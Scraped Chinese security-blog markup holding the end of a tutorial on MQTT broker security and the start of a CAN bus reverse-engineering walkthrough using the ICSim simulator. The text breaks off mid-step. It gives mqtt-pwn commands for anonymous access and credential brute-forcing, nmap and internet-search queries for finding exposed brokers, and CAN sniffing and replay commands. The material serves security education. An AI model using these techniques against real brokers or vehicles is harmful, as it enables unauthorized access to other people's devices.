&lt;p&gt;运行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker-compose ps
docker-compose run cli
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;即可看到mqtt-pwn的界面。&lt;br&gt;
&lt;img src=&#34;https://p2.ssl.qhimg.com/t0145aba7cf70a0a690.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;MQTT匿名访问&lt;/strong&gt;&lt;br&gt;
有一些MQTT的服务端软件默认是开启匿名访问，如果管理员没有网络安全意识或懒惰，只要对公网开放，任何人都可以直接访问。&lt;/p&gt;
&lt;p&gt;使用mqtt-pwn的connect命令进行连接。&lt;code&gt;connect -h&lt;/code&gt; 显示帮助信息，其他命令也是如此，使用时，多看帮助和文档，很快就可以熟悉使用。&lt;br&gt;
对于开启匿名的服务，直接&lt;code&gt;connect -o host&lt;/code&gt; 即可，当然该命令也支持输入用户名和密码。如果没有显示连接异常，就表示连接成功。连接成功后，可使用&lt;code&gt;system_info&lt;/code&gt; 查看系统信息。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://p4.ssl.qhimg.com/t01287faaad96ebfc43.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;接下来就可以查看topic信息等内容。这时先执行&lt;code&gt;discovery&lt;/code&gt;，等待显示scan  #1 has finished，接下来执行&lt;code&gt;scans -i 序号&lt;/code&gt;，在执行&lt;code&gt;topics&lt;/code&gt;命令即可看到topic信息。 其中&lt;code&gt;disconvery&lt;/code&gt;可以使用&lt;code&gt;-t&lt;/code&gt;参数设置超时时间。&lt;code&gt;topics&lt;/code&gt;命令可以使用&lt;code&gt;-l&lt;/code&gt;参数设置查看条数。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://p5.ssl.qhimg.com/t0178206285c0ae4785.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;可以输入&lt;code&gt;messages&lt;/code&gt;查看topic的内容。使用&lt;code&gt;-l&lt;/code&gt;限制条数，&lt;code&gt;-i&lt;/code&gt;参数查看某个单挑消息内容等。&lt;br&gt;
&lt;img src=&#34;https://p3.ssl.qhimg.com/t0160bb2c89e37fa7c6.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://p5.ssl.qhimg.com/t016e010021b6700142.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;MQTT用户名密码爆破&lt;/strong&gt;&lt;br&gt;
metasploit带有MQTT的爆破模块，经过实际测试，效果并不理想。这里仍然以mqtt-pwn来进行介绍。&lt;br&gt;
mqtt-pwn具有bruteforce功能，并带了一个简单的字典，可以爆破MQTT的用户名和密码。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bruteforce --host host --port -uf user_dic -pf pass_dic 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;端口默认是1883，用户和密码字典默认会在mqtt-pwn的&lt;code&gt;resources/wordlists&lt;/code&gt; 文件夹下。&lt;/p&gt;
&lt;p&gt;例如执行&lt;code&gt;bruteforce --host 127.0.0.1&lt;/code&gt;爆破。爆破成功后就可以使用上面将到的内容进行连接进行操作，在连接时加上用户名和密码选项即可。&lt;/p&gt;
&lt;p&gt;mqtt-pwn还支持更多功能，如&lt;a href=&#34;https://mqtt-pwn.readthedocs.io/en/latest/plugins/owntracks.html&#34;&gt;Owntracks (GPS Tracker)&lt;/a&gt;、&lt;a href=&#34;https://mqtt-pwn.readthedocs.io/en/latest/plugins/sonoff.html&#34;&gt;Sonoff Exploiter&lt;/a&gt;等。感兴趣的大家自己去看下文档去进行测试。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;应用中发现&lt;/strong&gt;&lt;br&gt;
在实际的使用场景我们可以通过中间人劫持从流量中捕获验证信息。以下为wireshark抓包内容。&lt;br&gt;
&lt;img src=&#34;https://p5.ssl.qhimg.com/t014090f26a582af519.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;除此之外，由于目前多种语言实现了mqtt的客户端，web应用中还有webscoket的mqtt。这使得可以通过web的网页源码或网络请求获得验证的信息。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://p5.ssl.qhimg.com/t01c3af2e34139f7a84.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;服务端漏洞&lt;/strong&gt;&lt;br&gt;
这里列举一些历史上MQTT的漏洞供参考。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://www.cvedetails.com/cve/CVE-2017-7296/&#34;&gt;CVE-2017-7296&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://mosquitto.org/blog/2017/05/security-advisory-cve-2017-7650/&#34;&gt;CVE-2017-7650&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2018-17614&#34;&gt;CVE-2018-17614&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://hackerone.com/reports/541354&#34;&gt;CVE-2019-5432&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2020-13849&#34;&gt;CVE-2020-13849&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://mosquitto.org/security/&#34;&gt;Mosquitto漏洞列表&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;探测与发现&#34;&gt;探测与发现&lt;/h2&gt;
&lt;p&gt;功能强大的nmap是支持MQTT协议的识别的，可以直接通过nmap进行识别MQTT协议。另外，除上面提到的默认端口外，有的管理员会修改默认端口，这时也可以尝试1884，8084，8884等临近端口以进行快速探测，或前面增加数字等作为组合，如果针对单个目标，则可以探测全部端口。如果进行大规模的扫描或者提升扫描效率，则可以使用masscan、zmap、RustScan等先进性端口扫描，在使用nmap进行协议识别即可。&lt;br&gt;
nmap举例命令如下：&lt;br&gt;
&lt;code&gt;sudo nmap -p1883,8083,8883 -sS -sV --version-intensity 9 -Pn --open target_ip&lt;/code&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://p3.ssl.qhimg.com/t018117aa19a2c9274f.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;nmap也有相关的MQTT lua脚本可以使用，其MQTT版本为3.1.1。脚本地址为&lt;a href=&#34;https://svn.nmap.org/nmap/nselib/mqtt.lua&#34;&gt;https://svn.nmap.org/nmap/nselib/mqtt.lua&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;如果想要自己编写代码去进行探测，只需要根据MQTT的协议标准，通过socket即可进行收发报文。关于MQTT协议的详细内容可以查看文档，地址为&lt;a href=&#34;https://docs.oasis-open.org/mqtt/mqtt/&#34;&gt;https://docs.oasis-open.org/mqtt/mqtt/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;现有的网络空间测绘平台基本都实现了对MQTT进行探测。可直接通过这些搜索引擎获取大量对外使用MQTT协议的服务。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;知风&lt;br&gt;
在针对IoT和ICS探测的搜索引擎知风中搜索，直接搜索&lt;code&gt;mqtt&lt;/code&gt;关键字，可以发现15万个对外开放的服务。&lt;br&gt;
&lt;img src=&#34;https://p1.ssl.qhimg.com/t01e5819f5a7da4e34c.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;fofa&lt;br&gt;
搜索关键字为&lt;code&gt;protocol=mqtt&lt;/code&gt;，一年内有25万个对外开放。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://p2.ssl.qhimg.com/t0137efdf7d38a450f0.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;shodan&lt;br&gt;
搜索关键字：&lt;br&gt;
product:&amp;quot;MQTT&amp;quot;&lt;br&gt;
product:&amp;quot;Mosquitto&amp;quot;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;shodan上搜索后共有超过11万个对外开放。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://p5.ssl.qhimg.com/t0146755084862cf215.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;通过以上的搜索结果，各引擎各有优劣。shodan和知风针对该协议的探测均会列出topic；而fofa从发现数量上最多，但是仅识别了协议，并未列出topic；除此之外知风系统的地理位置定位精度较高，可以定位百米范围内。&lt;/p&gt;
&lt;h2 id=&#34;mqtt-安全建议&#34;&gt;mqtt 安全建议&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;请勿启用匿名访问，对服务端（BROKER）设置认证，增加用户名密码验证。&lt;/li&gt;
&lt;li&gt;根据实际情况，优先使用加密传输数据，防止中间人攻击。&lt;/li&gt;
&lt;li&gt;加密payload后在进行安全传输。&lt;/li&gt;
&lt;li&gt;使用最新的服务端程序架设服务。&lt;/li&gt;
&lt;li&gt;不要将实现的代码上传到github等代码公开平台。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;小结&#34;&gt;小结&lt;/h2&gt;
&lt;p&gt;写这篇文章时，网络上关于MQTT安全的文章并不多，但是通过对其了解，仍然有不少内容可以探索，比如在工业上有MQTT网关，以及众多支持MQTT的服务端软件、加上广泛的应用场景。本文简单介绍MQTT安全的内容，还有更多的内容等待探索。感兴趣的朋友也欢迎大家多多交流讨论。&lt;/p&gt;
&lt;p&gt;最后，提醒一下大家，在学习和研究过程中自己搭建服务进行学习。请勿对网络上的目标进行测试、破坏等活动。&lt;/p&gt;
&lt;h2 id=&#34;引用&#34;&gt;引用&lt;/h2&gt;
&lt;p&gt;https://dzone.com/articles/exploiting-mqtt-using-lua&lt;br&gt;
https://www.hindawi.com/journals/wcmc/2018/8261746/&lt;br&gt;
https://github.com/akamai-threat-research/mqtt-pwn&lt;br&gt;
https://morphuslabs.com/hacking-the-iot-with-mqtt-8edaf0d07b9b&lt;br&gt;
https://book.hacktricks.xyz/pentesting/1883-pentesting-mqtt-mosquitto&lt;br&gt;
https://hackmd.io/@QwmL8PAwTx-bYDnry-ONpA/H1nm2tHzb?type=view&lt;br&gt;
https://ttm4175.iik.ntnu.no/prep-iot-mqtt.html&lt;br&gt;
https://mobilebit.wordpress.com/tag/mqtt/&lt;br&gt;
https://www.hivemq.com/blog/seven-best-mqtt-client-tools/&lt;br&gt;
https://nmap.org/nsedoc/lib/mqtt.html&lt;br&gt;
http://mqtt.p2hp.com/&lt;/p&gt;
">物联网安全之MQTT协议安全</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/hacking-all-the-cars-can-bus-reverse/"" data-c="
          &lt;p&gt;本文主要是通过ICSim(Instrument Cluster Simulator)模拟CAN协议通信，通过实践对CAN总线协议进行逆向分析。在实践过程中踩过一些坑，这里跟大家分享交流。&lt;/p&gt;
&lt;h2 id=&#34;简介&#34;&gt;简介&lt;/h2&gt;
&lt;p&gt;CAN(Controller Area Network)总线是制造业和汽车产业中使用的一种简单协议，为ISO国际标准化的串行通信协议。在现代汽车中的小型嵌入式系统和ECU能够使用CAN协议进行通信，其通信是采用的广播机制，与TCP协议中的UDP差不多。各个系统或ECU（电子控制单元）都可以收发控制消息。1996年起该协议成了美国轿车和轻型卡车的标准协议之一，但是直到2008年才成为强制标准（2001年成为欧洲汽车标准）。当然1996年之前的也有可能使用CAN总线。现在，汽车的电子组件均通过CAN总线连接，针对汽车的攻击最终也都会通过CAN总线来实现。对于研究汽车安全，CAN总线协议是必须要掌握的。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;h2 id=&#34;环境与准备&#34;&gt;环境与准备&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;CAN总线模拟--ICSim&lt;/li&gt;
&lt;li&gt;分析工具-- can-utils、Kayak、Wireshark&lt;/li&gt;
&lt;li&gt;系统--Kali Linux 2020 语言为中文（非root权限）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;icsim编译&#34;&gt;ICSim编译&lt;/h3&gt;
&lt;p&gt;ICSim(Instrument Cluster Simulator)，是由Open Garages推出的工具。它可以产生多个CAN信号，同时会产生许多背景噪声，让我们可以在没有汽车或不改造汽车的情况下即可练习CAN总线的逆向技术。&lt;/p&gt;
&lt;p&gt;GITHUB地址：&lt;a href=&#34;https://github.com/zombieCraig/ICSim&#34;&gt;https://github.com/zombieCraig/ICSim&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ICSim目前仅可运行在linux系统下，在Kali linux上按照github提供的安装方法，会出现“libsdl2-dev 未满足的依赖关系”的错误，错误如下图。&lt;br&gt;
&lt;img src=&#34;https://p1.ssl.qhimg.com/t0108e075fc23454fc4.png&#34; alt=&#34;ICSim安装出错&#34; title=&#34;ICSim安装出错&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以通过aptitude安装来解决，具体安装步骤如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-get update 
sudo apt-get install aptitude
sudo aptitude install libibus-1.0-dev
sudo apt-get install gcc
git clone https://github.com/zombieCraig/ICSim
cd ICSim
make
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;至此ICSim安装完成，目录内容如下：&lt;br&gt;
&lt;img src=&#34;https://p3.ssl.qhimg.com/t012c81b11ee13908a0.png&#34; alt=&#34;ICsim安装完成&#34; title=&#34;ICsim安装完成&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;切换到ICSim目录，执行如下命令。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./setup_vcan.sh         #初始化，每次重启后都要重新运行
./icsim vcan0           #模拟器
./controls vcan0        #控制面
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行后可以看到如下界面，像游戏手柄的界面是控制面板（这里可以插入USB游戏手柄进行控制，笔者这里没有，有USB手柄的大家可自行测试）。另外有仪表盘的窗口是模拟器，速度表停在略高于0mph的位置，如果指针有摆动就说明ICSim工作正常。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://p4.ssl.qhimg.com/t01ffdc6dd4e1d1e56f.png&#34; alt=&#34;ICSim启动&#34; title=&#34;ICSim启动&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;其控制器的按键说明如下：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;功能&lt;/th&gt;
&lt;th&gt;按键&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;加速&lt;/td&gt;
&lt;td&gt;上方向键&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;左转向&lt;/td&gt;
&lt;td&gt;左方向键&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;右转向&lt;/td&gt;
&lt;td&gt;右方向键&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;开/关左车门（前）锁&lt;/td&gt;
&lt;td&gt;右/左shift+A&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;开/关右车门（前）锁&lt;/td&gt;
&lt;td&gt;右/左shift+B&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;开/关左车门（后）锁&lt;/td&gt;
&lt;td&gt;右/左shift+X&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;开/关右车门（后）锁&lt;/td&gt;
&lt;td&gt;右/左shift+Y&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;开启所有车门锁&lt;/td&gt;
&lt;td&gt;右shift+左shift&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;关闭所有车门锁&lt;/td&gt;
&lt;td&gt;左shift+右shift&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;上面的&lt;code&gt;setup_vcan.sh&lt;/code&gt; 主要功能是加载CAN和vCAN（virtual controller area network）网络模块。并创建名为vcan0的网络设备并打开连接。&lt;br&gt;
&lt;code&gt;setup_vcan.sh&lt;/code&gt;文件内容如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo modprobe can
sudo modprobe vcan
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行后，我们可以使用ifconfig来查看网络接口，发现会多出来一个vcan0的网络接口。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://p5.ssl.qhimg.com/t01cd5ca29d841c211e.png&#34; alt=&#34;vcan网络接口&#34; title=&#34;vcan网络接口&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;can-utils安装&#34;&gt;can-utils安装&lt;/h3&gt;
&lt;p&gt;can-utils是CAN实用的工具套件，包含了许多实用程序。&lt;/p&gt;
&lt;p&gt;GITHUB地址：&lt;a href=&#34;https://github.com/linux-can/can-utils&#34;&gt;https://github.com/linux-can/can-utils&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;经常用到的几个程序如下，更多命令可以看github地址：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;candump : 显示、过滤和记录CAN数据到文件。candump并不会解码数据。&lt;/li&gt;
&lt;li&gt;canplayer : 对记录的CAN数据进行重放。&lt;/li&gt;
&lt;li&gt;cansend : 发送CAN数据。&lt;/li&gt;
&lt;li&gt;cansniffer : 显示CAN数据并高亮显示变化的字节。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当前环境使用的Kali Linux 2020直接使用如下命令安装即可。如果你的系统不支持，则可以直接下载github上的源码，使用make命令进行编译安装。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-get install can-utils
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;kayak&#34;&gt;Kayak&lt;/h3&gt;
&lt;p&gt;Kayak可以直接通过github下载release版本的。但是，该工具的使用需要配合socketcand。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;socketcand安装&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;sudo apt install automake
git clone https://github.com/linux-can/socketcand.git
cd socketcand
./autogen.sh
./configure
make
sudo make install
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Kayak下载&lt;br&gt;
GITHUB下载：&lt;a href=&#34;https://github.com/dschanoeh/Kayak/releases&#34;&gt;https://github.com/dschanoeh/Kayak/releases&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;解压缩后，bin文件夹下有windows版本和linux的运行程序。Kali下直接在terminal下运行./kayak 即可。当然这里也可以下载源代码，并使用maven编译。&lt;/p&gt;
&lt;h2 id=&#34;前置知识&#34;&gt;前置知识&lt;/h2&gt;
&lt;p&gt;上面已经准备好了环境，在真正开始分析之前，先简单说一些前置知识。&lt;/p&gt;
&lt;h3 id=&#34;can总线&#34;&gt;CAN总线&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;CAN运行在两条线路上：CAN高电平（CANHI）和CAN低电平（CANLO）。&lt;/li&gt;
&lt;li&gt;CAN bus 有四种帧类型&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;帧类型&lt;/th&gt;
&lt;th&gt;用途&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;数据帧（Data Frame）&lt;/td&gt;
&lt;td&gt;包含要传输的节点数据的帧&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;远程帧（Remote Frame）&lt;/td&gt;
&lt;td&gt;请求传输特定标识符的帧&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;错误帧（Remote Frame）&lt;/td&gt;
&lt;td&gt;任何检测到错误的节点发送的帧&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;重载帧（Overload Frame）&lt;/td&gt;
&lt;td&gt;在数据或远程帧之间插入延迟的帧&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;CAN有两种类型的消息(帧)格式：标准（基础）帧格式和扩展帧格式。标准（基础）帧有11位标识符，扩展帧格式有29位标识符。CAN标准帧格式和CAN扩展帧格式之间的区别是通过使用IDE位进行的，IDE位在11位帧的情况下以显性方式传输，而在29位帧的情况下以隐性方式进行传输。支持扩展帧格式消息的CAN控制器也能够以CAN基本帧格式发送和接收消息。&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;标准帧格式&lt;br&gt;
说一下主要的4个元素，其他的大家感兴趣可自行去了解：
&lt;ul&gt;
&lt;li&gt;仲裁ID（Arbitration ID）：仲裁ID是一种广播消息，用来识别正视图通信的设备的ID，其实也代表发送消息的地址。任何的设备都可以发送多个仲裁ID。在总线中同时发送的消息，低仲裁ID的消息拥有优先权。&lt;/li&gt;
&lt;li&gt;标识符扩展（IDE）：标准帧格式该位始终是0。&lt;/li&gt;
&lt;li&gt;数据长度码（DLC）：表示数据的大小，番位是0字节到8字节。&lt;/li&gt;
&lt;li&gt;数据（Data）：总线传输数据本身。一个标准的数据帧可携带最大尺寸为8字节。有些系统中会强制要求8字节，不满8字节则填充为8字节。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://p1.ssl.qhimg.com/t012f6fcd1baa40a15f.png&#34; alt=&#34;CAN总线协议&#34; title=&#34;CAN总线协议&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;扩展帧格式&lt;br&gt;
扩展帧格式与标准帧格式类似，扩展帧格式可以连接在一起，形成更长的ID。拓展帧格式可包含标准帧格式。拓展帧格式的标识符扩展IDE被设置为1。扩展帧有一个18位的标识符，是标准的11位标识符的第二部分。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;can总线威胁&#34;&gt;CAN总线威胁&lt;/h3&gt;
&lt;p&gt;根据CAN总线的特性，我们则可以了解CAN面临的威胁：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;CAN总线通信是广播的方式，所以数据是可以被监听和获取的。&lt;/li&gt;
&lt;li&gt;CAN总线协议中ID代表报文优先级，协议中没有原始地址信息。也就是说任何人都可以伪造和发送虚假或恶意的报文。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;另外拒绝服务攻击在CAN总线协议中也是存在的。但是我们主要是分析和逆向CAN总线。这里不做相关说明。&lt;/p&gt;
&lt;h3 id=&#34;监听can流量&#34;&gt;监听CAN流量&lt;/h3&gt;
&lt;p&gt;监听CAN流量有多种方法。首先请保证启动ICSim。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;can-utils 工具包监听&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;candump -l vcan0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入该命令后会监听流量并以candump-YYYY-MM-DD_time.log格式的文件名保存到当前目录下。如candump-2020-06-22_103240.log。按ctrl+c停止监听。&lt;br&gt;
打开文件，数据格式如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(1592836523.941032) vcan0 164#0000C01AA8000022
(1592836523.941168) vcan0 17C#0000000010000003
(1592836523.941285) vcan0 18E#00004D
(1592836523.941387) vcan0 1CF#80050000000F
(1592836523.941745) vcan0 1DC#0200000C
(1592836523.943317) vcan0 183#0000000E0000100D
(1592836523.943545) vcan0 143#6B6B00C2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;括号内的是时间戳，vcan0为我们的虚拟can接口。后面的是ID和数据，ID和数据以#号分割。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://p4.ssl.qhimg.com/t01b672639867e53755.png&#34; alt=&#34;candump&#34; title=&#34;candump&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;也可以去掉-l选项，直接在屏幕上可以打印数据包。&lt;/p&gt;
&lt;p&gt;candump是监听并记录原始数据，会有很多对我们无用的数据。can-utils工具包中还有一款可以根据仲裁ID进行分组显示，并对变化的数据以红色显示，它就是cansniffer。&lt;br&gt;
命令：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cansniffer -c vcan0
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://p0.ssl.qhimg.com/t01ae91fe1caf0be3b1.png&#34; alt=&#34;cansniffer&#34; title=&#34;cansniffer&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;cansniffer可以通过发送按键来过滤显示数据包。注意，当输入按键时，并不会在终端中显示，输入完成后按回车键（一定要记得按）。如下例子则是先关闭所有数据包显示（-000000），然后仅显示ID133和ID244的数据包。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;-000000
+133
+244
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;Wireshark 监听&lt;br&gt;
wireshark功能简直太强大了，它也可以捕获CAN数据报文。打开wireshark，选择vcan0接口即可监听流量。info列中可以看到ID和数据。wireshark也是原始流量，并为进行去重。&lt;br&gt;
&lt;img src=&#34;https://p5.ssl.qhimg.com/t01f244f261e0e195c2.png&#34; alt=&#34;wireshark捕获can协议数据&#34; title=&#34;wireshark捕获can协议数据&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Kayak监听&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;运行socketcand -i vcan0，socketcand可以挂接多个CAN设备，接口名使用逗号分割即可。&lt;/li&gt;
&lt;li&gt;然后切换到Kayak的bin目录下，运行./kayak。&lt;/li&gt;
&lt;li&gt;单击File菜单-&amp;gt;new project(或者ctrl+n快捷键)，输入project名字。&lt;/li&gt;
&lt;li&gt;展开右下角connections窗口中的auto discovery，将下面的内容拖到新建的project中并输入一个名字。&lt;/li&gt;
&lt;li&gt;右键上一步中创建的bus，选择OPEN Raw View。&lt;/li&gt;
&lt;li&gt;单击工具栏中的play 按钮。开始捕获CAN总线流量。点击colorize可以对有变化的数据以不同颜色。同时还可以暂停和停止监听流量操作。&lt;br&gt;
&lt;img src=&#34;https://p0.ssl.qhimg.com/t019d504620fd505278.png&#34; alt=&#34;Kayak捕获CAN数据&#34; title=&#34;Kayak捕获CAN数据&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;candump和wireshark监听的流量都是原始流量，我们看到的数据非常多。而Kayak可以按照仲裁ID来进行分组显示，并对不同的&lt;/p&gt;
&lt;h3 id=&#34;重放can流量&#34;&gt;重放CAN流量&lt;/h3&gt;
&lt;p&gt;canplayer程序可以重放candump记录的流量内容。&lt;br&gt;
输入如下命令即可重放。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;canplayer -i candump的log文件
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;重放时，可以观察下ICSim仪表盘是否有变化。&lt;/p&gt;
&lt;p&gt;对于CAN分析的工具不仅只有这几个，也可以多尝试其他网络上的工具。&lt;/p&gt;
&lt;h2 id=&#34;can消息逆向&#34;&gt;CAN消息逆向&lt;/h2&gt;
&lt;p&gt;在实战中，各个制造商和车型都有自己唯一的CAN数据包格式，而分析通信数据主要是目的是找到某个特定的信号，例如开车门锁，启动车等。通过上面监听数据，可以看到会有很多数据，这主要由于汽车本身会有很多设备会按照制定的间隔发送数据，这些数据可以称为噪音，这对分析某个具体动作带来麻烦。所以需要对CAN消息进行逆向分析。&lt;/p&gt;
&lt;h3 id=&#34;二分法&#34;&gt;二分法&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;首先通过candump监听数据。&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;candump -l vcan0
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;回到控制器界面，进行开门锁操作，然后在关闭车门锁。&lt;/li&gt;
&lt;li&gt;停止监听数据。数据保存到执行&lt;code&gt;mv candump-2020-06-22_140718.log source&lt;/code&gt; (文件名根据实际情况修改)&lt;/li&gt;
